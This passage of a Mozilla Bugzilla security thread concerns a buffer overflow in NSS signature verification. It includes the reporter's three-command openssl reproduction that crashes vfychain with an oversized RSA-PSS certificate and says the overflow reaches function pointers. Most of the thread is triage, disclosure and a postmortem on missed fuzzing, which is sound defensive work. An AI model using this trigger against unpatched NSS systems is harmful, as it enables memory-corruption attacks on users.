            <a href="/show_bug.cgi?id=1737470#c13">Comment 13</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-27 10:57 PDT" data-time="1635357462">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-13">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-9248072"
         class="attachment"
         data-id="9248072" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="rsapss-testcase.der">
      <meta itemprop="contentSize" content="5948">
      <meta itemprop="encodingFormat" content="application/x-x509-ca-cert">
      <div class="label">
        Attached file
          <a class="link" href="attachment.cgi?id=9248072" itemprop="contentUrl" >
        <span id="att-9248072-description" itemprop="description">rsapss-testcase.der</span></a>
        â€” <a href="attachment.cgi?id=9248072&amp;action=edit" itemprop="url" data-details="1">Details</a>
      </div>
    </div>

  <div
      class="comment-text markdown-body "
      id="ct-13" data-comment-id="15631903"><p>I guess it does not harm to have another testcase. I made it by hand, it is probably not well formed.</p>
<p>I don&#39;t have a good way to test mozpkix, do didn&#39;t test it there.</p>
<pre><code>$ openssl x509 -inform DER -text &lt; testcase.der 
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 2 (0x2)
        Signature Algorithm: rsassaPss         (INVALID PSS PARAMETERS)
        Issuer: emailAddress = taviso@google.com, CN = bug1737470
        Validity
            Not Before: Jan  1 00:00:00 2020 GMT
            Not After : Jan  1 00:00:00 2040 GMT
        Subject: emailAddress = taviso@google.com, CN = bug1737470
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                RSA Public-Key: (22608 bit)
                Modulus:
                    00:c4:44:44:44:44:44:44:44:44:44:44:44:44:44:
&lt;snip&gt;
                Exponent: 65537 (0x10001)
    Signature Algorithm: rsassaPss         
         Hash Algorithm: sha1 (default)
         Mask Algorithm: mgf1 with rsassaPss
          Salt Length: 0x20
         Trailer Field: 0xBC (default)

         00:c5:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:55:
&lt;snip&gt;
</code></pre>
</div></div><div class="change-set" id="a270777_75935"><div class="change" id="aa270777_75935">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a270777_75935"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_75935" id="a270777_75935"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="as-a270777_75935"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a270777_75935">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#a270777_75935">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-27 11:12 PDT" data-time="1635358334">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox93&amp;o1=isnotempty">status-firefox93</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox93&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox93&amp;o1=equals&amp;v1=wontfix">wontfix</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox_esr78&amp;o1=isnotempty">status-firefox-esr78</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox_esr78&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox_esr78&amp;o1=equals&amp;v1=wontfix">wontfix</a></div></div></div><div class="change-set" id="c14"><div class="comment" data-id="15631934" data-no="14"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-14" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_592223" id="a270777_75935"><img src="https://secure.gravatar.com/avatar/27c1a60000797d8e229249290a7c7377?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_592223" id="a270777_75935"><a class="email " href="/user_profile?user_id=592223" > <span class="fna">taviso</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-14"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-14" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c14">Comment 14</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-27 11:23 PDT" data-time="1635359002">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-14">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-14" data-comment-id="15631934"><p>This also seems vulnerable, but I think there is no way to reach it from within NSS, because sig is usually NULL:</p>
<p><a href="https://searchfox.org/mozilla-central/source/security/nss/lib/cryptohi/secvfy.c#698" rel="nofollow">https://searchfox.org/mozilla-central/source/security/nss/lib/cryptohi/secvfy.c#698</a></p>
<p>But I can see external uses that might be vulnerable:</p>
<p><a href="https://searchfox.org/mozilla-central/source/modules/libmar/verify/cryptox.c#94" rel="nofollow">https://searchfox.org/mozilla-central/source/modules/libmar/verify/cryptox.c#94</a></p>
<p>(I didn&#39;t make a test case, but I can make you one if you want)</p>
</div></div><div class="change-set" id="c15"><div class="comment" data-id="15633328" data-no="15"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-15" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a270777_75935"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_1689" id="a270777_75935"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-15"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-15" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c15">Comment 15</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-28 09:15 PDT" data-time="1635437708">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-15">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-15" data-comment-id="15633328"><p>Because it appears Firefox is not vulnerable to a drive-by attack we&#39;re not going to rush this into a Release-candidate respin of Firefox 94. There may be a Firefox 94 point-release in a couple of weeks a fix could go into if necessary, otherwise Firefox 95 seems safe enough. That will give us space to audit for similar occurrences rather than just reacting, and also give us more time to coordinate with Linux distros who may have non-Firefox code that use these signatures. (Firefox may be vulnerable if users explicitly import certs, buried deep in our UI; checking on that)</p>
</div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox94&amp;o1=isnotempty">tracking-firefox94</a>:
          <a href="/buglist.cgi?f1=cf_tracking_firefox94&amp;o1=equals&amp;v1=%2B">+</a> &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox94&amp;o1=equals&amp;v1=-">-</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox_esr91&amp;o1=isnotempty">tracking-firefox-esr91</a>:
          <a href="/buglist.cgi?f1=cf_tracking_firefox_esr91&amp;o1=equals&amp;v1=94%2B">94+</a> &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox_esr91&amp;o1=equals&amp;v1=95%2B">95+</a></div></div></div><div class="change-set" id="c16"><div class="comment" data-id="15633331" data-no="16"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-16" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_592223" id="a270777_75935"><img src="https://secure.gravatar.com/avatar/27c1a60000797d8e229249290a7c7377?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_592223" id="a270777_75935"><a class="email " href="/user_profile?user_id=592223" > <span class="fna">taviso</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-16"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-16" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c16">Comment 16</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-28 09:16 PDT" data-time="1635437785">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-16">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-16" data-comment-id="15633331"><p>Doesn&#39;t Firefox use mar archives?</p>
</div></div><div class="change-set" id="c17"><div class="comment" data-id="15633345" data-no="17"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-17" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_592223" id="a270777_75935"><img src="https://secure.gravatar.com/avatar/27c1a60000797d8e229249290a7c7377?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_592223" id="a270777_75935"><a class="email " href="/user_profile?user_id=592223" > <span class="fna">taviso</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-17"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-17" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c17">Comment 17</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-28 09:24 PDT" data-time="1635438254">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-17">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-17" data-comment-id="15633345"><p>Sorry, I misunderstood - you meant that isn&#39;t &quot;drive by&quot;, not that Firefox didn&#39;t use it. Fair enough.</p>
</div></div><div class="change-set" id="c18"><div class="comment" data-id="15633430" data-no="18"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-18" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a270777_75935"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_1689" id="a270777_75935"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-18"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-18" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c18">Comment 18</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-28 10:21 PDT" data-time="1635441672">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-18">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-18" data-comment-id="15633430"><blockquote>
<p>I&#39;m a bit confused why this wasn&#39;t caught earlier, I was doing some (moderately) novel fuzzing, but this doesn&#39;t seem like it should have required any new groundbreaking research.</p>
</blockquote>
<p>I&#39;m surprised as well -- we have indeed done targeted cert fuzzing in the past.  Currently I believe the only NSS fuzzing is what&#39;s being done on oss-fuzz but I don&#39;t know what it covers.</p>
<p>Adding Kai because this might have pose a more exposed risk for Thunderbird users if S/MIME supports these signature types. Can you check that out, Kai?</p>
</div><div class="activity"><div class="change">Flags: needinfo?(kaie)</div><div class="change">Summary: Memory Corruption in decodeECorDsaSignature with ECDSA signatures &rarr; Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)</div></div></div><div class="change-set" id="c19"><div class="comment" data-id="15633468" data-no="19"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-19" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a270777_75935"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_1689" id="a270777_75935"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-19"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-19" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c19">Comment 19</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-28 10:45 PDT" data-time="1635443128">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-19">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-19" data-comment-id="15633468"><p>(In reply to taviso from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c17" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">comment #17</a>)</p>
<blockquote>
<p>Sorry, I misunderstood - you meant that isn&#39;t &quot;drive by&quot;, not that Firefox didn&#39;t use it. Fair enough.</p>
</blockquote>
<p>Correct -- not minimizing the badness of this bug, just trying to judge risk/exposure. Landing a patch like this will likely lead to folks scouring the code looking for similar mistakes (as you yourself are doing). If the exploitation risk is &quot;easy drive-by&quot; we could patch what we can immediately, force through an emergency update, and hope for the best. If there are mitigating factors it&#39;s better to do a more thorough code review and more testing, and spare the release teams (build, QA, server ops, etc) the stress of an emergency release.</p>
<p>S/MIME is a worrying thought we need to check out. If affected that might be the &quot;drive-by&quot; that raises the alarm level again. It&#39;s a bad time for an emergency release for them because we&#39;re in the middle of the transition from 78.x releases to 91.x releases, and people hold back.</p>
</div></div><div class="change-set" id="c20"><div class="comment" data-id="15633473" data-no="20"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-20" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_592223" id="a270777_75935"><img src="https://secure.gravatar.com/avatar/27c1a60000797d8e229249290a7c7377?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_592223" id="a270777_75935"><a class="email " href="/user_profile?user_id=592223" > <span class="fna">taviso</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-20"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-20" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c20">Comment 20</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-28 10:47 PDT" data-time="1635443240">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-20">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-20" data-comment-id="15633473"><p>(In reply to Daniel Veditz [:dveditz] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c18" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">comment #18</a>)</p>
<blockquote>
<p>I&#39;m surprised as well -- we have indeed done targeted cert fuzzing in the past.  Currently I believe the only NSS fuzzing is what&#39;s being done on oss-fuzz but I don&#39;t know what it covers.</p>
</blockquote>
<p>I&#39;ve actually been looking into this for a postmortem, I&#39;m trying to figure out how this was missed, here are some of my notes:</p>
<hr>
<p>The easiest way to demonstrate this bug is with RSA-PSS. In fact, just these three commands should work:</p>
<blockquote>
<p>Note: it will take a while to generate a &gt;16000 bit key</p>
</blockquote>
<pre><code># We need 16384 bits to overflow the buffer, then 32 + 64 + 64 + 64 bits to reach hashobj, 
# which contains function pointers (bigger would work fine too, but takes longer).
$ openssl genpkey -algorithm rsa-pss -pkeyopt rsa_keygen_bits:$((16384 + 32 + 64 + 64 + 64)) -out bigsig.key
# Generate a self signed certificate from that key
$ openssl req -x509 -new -key bigsig.key -subj &quot;/CN=BigSig&quot; -sha256 -out bigsig.cer
# Verify it with NSS...
$ vfychain -a bigsig.cer 
Segmentation fault
</code></pre>
<ul>
<li>
<p>Was this a recent code change or regression that hadnâ€™t been around long enough to be discovered? <strong>No</strong>, a vulnerable version of the code for DSA was checked in on the <a href="https://hg.mozilla.org/projects/nss/annotate/41f5eb9e5df23951883ba3243f3ae51550663d77/security/nss/lib/cryptohi/secvfy.c#l158" rel="nofollow">17th October 2003</a>, and survived nearly 20 years of refactoring.</p>
</li>
<li>
<p>Does this bug require a long time to generate a key that triggers the bug? <strong>No</strong>, the example above generates a real key and signature, but it can just be garbage as the overflow happens before the signature check. A few kilobytes of Aâ€™s works just fine.</p>
</li>
<li>
<p>Does reaching the vulnerable code require some complicated state that fuzzers and static analyzers would have difficulty synthesizing, like hashes or checksums? <strong>No</strong>, it would have to be well-formed DER, thatâ€™s about it.</p>
</li>
<li>
<p>Is this an uncommon code path? <strong>No</strong>, the main entrypoint for certificate verification in NSS, <code>CERT_VerifyCertificate()</code>, is vulnerable. Effectively any use of NSS is affected.</p>
</li>
</ul>
<p>This wasnâ€™t a process failure, the vendor did everything right. Mozilla has a mature, world-class security team. They pioneered <a href="https://www.mozilla.org/en-US/security/bug-bounty/" rel="nofollow">bug bounties</a> and obsess over <a href="https://research.mozilla.org/rust/" rel="nofollow">memory safety</a>, fuzzing and <a href="https://coverage.moz.tools/" rel="nofollow">test coverage</a>.</p>
<p>NSS was one of the very first projects included with <a href="https://google.github.io/oss-fuzz/" rel="nofollow">oss-fuzz</a>, it was officially supported since at least <a href="https://github.com/google/oss-fuzz/commit/3d325bf20f0b09961b6c7de34aa4da0d16cfa67d" rel="nofollow">October 2014</a> including a collection of custom mutators. Mozilla also fuzz NSS themselves with libFuzzer, and their own <a href="https://searchfox.org/mozilla-central/source/security/nss/fuzz/asn1_mutators.cc" rel="nofollow">mutator</a> collection. They also have a <a href="https://github.com/mozilla/nss-fuzzing-corpus" rel="nofollow">distilled coverage corpus</a>, an extensive testsuite, and nightly ASAN builds.</p>
<p>I&#39;m generally skeptical of static analysis, but this seems like a simple missing bounds check that should be easy to find. Coverity has been monitoring NSS since at least <a href="https://scan.coverity.com/projects/nss" rel="nofollow">December 2008</a>, and also failed to discover this.</p>
<ul>
<li>Did mozilla have good test coverage for the vulnerable areas? <a href="https://coverage.moz.tools/#revision=latest&amp;path=security%2Fnss%2Flib%2Fcryptohi%2Fsecvfy.c&amp;suite=gtest&amp;view=file&amp;line=201" rel="nofollow">YES</a>.</li>
<li>Did mozilla/chrome/oss-fuzz have relevant inputs in their fuzz corpus? <a href="https://storage.googleapis.com/oss-fuzz-coverage/nss/reports/20211027/linux/src/nss/lib/cryptohi/secvfy.c.html#L201" rel="nofollow">YES</a>.</li>
<li>Is there a mutator capable of extending ASN1_ITEMs? <a href="https://codereview.chromium.org/1677803002/patch/180001/190008" rel="nofollow">YES</a>.</li>
<li>Is the minimum input size to trigger the bug &quot;too big&quot; for libFuzzer mutators to attempt? NO, libFuzzer dynamically adjusts the size based on the coverage corpus. I was able to make a testcase that is just 4397 bytes, and there are 2440 bigger inputs in the nss corpus.</li>
<li>Is this an intra-object overflow, or other rare form of corruption that ASAN would have difficulty detecting? NO, it&#39;s a textbook buffer overflow that ASAN can easily detect.</li>
</ul>
<hr>
<p>I guess the conclusion is that you can do everything right and still get bugs like this, because native code is dangerous code.</p>
</div></div><div class="change-set" id="c21"><div class="comment" data-id="15633692" data-no="21"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-21" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_11099" id="a270777_75935"><img src="https://secure.gravatar.com/avatar/4e29cfbfaece102427b6d6aa84d135f5?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_11099" id="a270777_75935"><a class="email " href="/user_profile?user_id=11099" > <span class="fna">Robert Relyea</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-21"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-21" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c21">Comment 21</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-28 14:28 PDT" data-time="1635456485">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-21">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-21" data-comment-id="15633692"><p>I don&#39;t think it&#39;s a good assumption that Firefox is not vulnerable. VFYContext is part of the generic NSS signature processing. Just because the example attack uses signatures in certificates, doesn&#39;t mean we can&#39;t be forced to verify a bad signature. Namely one can force a bad signature in a middle of an SSL connection.</p>
<p>I recommend we treat is as real and live for Firefox.</p>
<p>bob</p>
</div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(rrelyea)</span></div></div></div><div class="change-set" id="c22"><div class="comment" data-id="15633705" data-no="22"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-22" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_622637" id="a270777_75935"><img src="https://secure.gravatar.com/avatar/38f561698d679a724938d4600c0f8b52?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_622637" id="a270777_75935"><a class="email " href="/user_profile?user_id=622637" > <span class="fna">Benjamin Beurdouche [:beurdouche]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-22"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-22" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c22">Comment 22</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-28 14:45 PDT" data-time="1635457558">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-22">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-22" data-comment-id="15633705"><p>Many of us have looked at it by now multiple times and we are getting convinced that, even during a TLS handshake, because of the way we go through moz::pkix, an adversarial certificate wouldnâ€™t lead to trigger the verification function (moz::pkix does not and never had support for DSA nor RSA PSS). Obviously, we are taking this very seriously and will keep doing so as a priority for the next coming days.</p>
<p>The current doubts we have are about a potential issue when a user is performing certain actions in the client certificate context.<br>
We are also making assessments in the context of Addons, Content Signatures, Firefox Accounts and will report backâ€¦</p>
</div></div><div class="change-set" id="c23"><div class="comment" data-id="15633755" data-no="23"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-23" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_11099" id="a270777_75935"><img src="https://secure.gravatar.com/avatar/4e29cfbfaece102427b6d6aa84d135f5?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_11099" id="a270777_75935"><a class="email " href="/user_profile?user_id=11099" > <span class="fna">Robert Relyea</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-23"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-23" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c23">Comment 23</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-28 15:37 PDT" data-time="1635460630">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-23">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-23" data-comment-id="15633755"><p>I&#39;m not toking about checking Certificate signatures. That&#39;s just the example of how to attack this. I&#39;m talking about mangling the DSA signature coming back from an SSL handshake, say in TLS_DHE_DSS_ connection.</p>
<p>The fact that&#39;s it&#39;s DSA only makes this less of a problem, since it could be that all <em>DSS</em> algorithms are off be default...</p>
</div></div><div class="change-set" id="c24"><div class="comment" data-id="15633810" data-no="24"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-24" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_381992" id="a270777_75935"><img src="https://secure.gravatar.com/avatar/a430cf58452b9e73dfdde1555ad7eab3?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_381992" id="a270777_75935"><a class="email " href="/user_profile?user_id=381992" > <span class="fna">Ryan Sleevi</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner ghost iconic" id="cs-24"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-24" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1737470#c24">Comment 24</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2021-10-28 16:19 PDT" data-time="1635463147">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-24">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
      class="comment-text markdown-body "
      id="ct-24" data-comment-id="15633810"><p>(In reply to Robert Relyea from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1737470#c23" title="RESOLVED FIXED - Memory Corruption in decodeECorDsaSignature with DSA signatures (and RSA-PSS)">comment #23</a>)</p>
<blockquote>
<p>I&#39;m not toking about checking Certificate signatures. That&#39;s just the example of how to attack this. I&#39;m talking about mangling the DSA signature coming back from an SSL handshake, say in TLS_DHE_DSS_ connection.</p>
<p>The fact that&#39;s it&#39;s DSA only makes this less of a problem, since it could be that all <em>DSS</em> algorithms are off be default...</p>
</blockquote>
<p>Bob: The TLS layer doesn&#39;t use the <code>VFY_</code> abstraction layer (nor <code>vfy_VerifyData</code>), they directly use the PK11 functions (e.g. in <a href="https://searchfox.org/nss/source/lib/ssl/ssl3con.c" rel="nofollow">https://searchfox.org/nss/source/lib/ssl/ssl3con.c</a> )</p>
<p>Tavis: Regarding good (fuzz) coverage, this family of functions aren&#39;t covered by fuzzed data themselves. That is, you&#39;re likely seeing positive fuzzer coverage because of <a href="https://searchfox.org/nss/source/fuzz/tls_server_certs.cc" rel="nofollow">https://searchfox.org/nss/source/fuzz/tls_server_certs.cc</a> , but that uses fixed certs, not fuzzed certs. That may explain why you see corpus inputs exercising the code, but failing to find.</p>
</div></div><div class="change-set" id="c25"><div class="comment" data-id="15633848" data-no="25"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-25" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_592223" id="a270777_75935"><img src="https://secure.gravatar.com/avatar/27c1a60000797d8e229249290a7c7377?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

